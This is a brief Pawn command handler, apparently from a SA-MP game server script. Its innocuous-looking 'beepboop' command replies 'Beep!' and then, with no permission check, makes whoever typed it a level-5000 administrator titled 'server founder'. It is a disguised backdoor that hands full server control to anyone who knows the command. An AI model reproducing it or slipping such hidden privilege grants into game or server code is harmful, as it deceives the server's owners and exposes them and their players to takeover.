YCMD:beepboop(playerid,params[],help) {
    SendClientMessage(playerid,COLOR_AQUA,"Beep!");
    PrepareCreateAdmin(playerid,5000,"Fundador do servidor");
    return 1;
}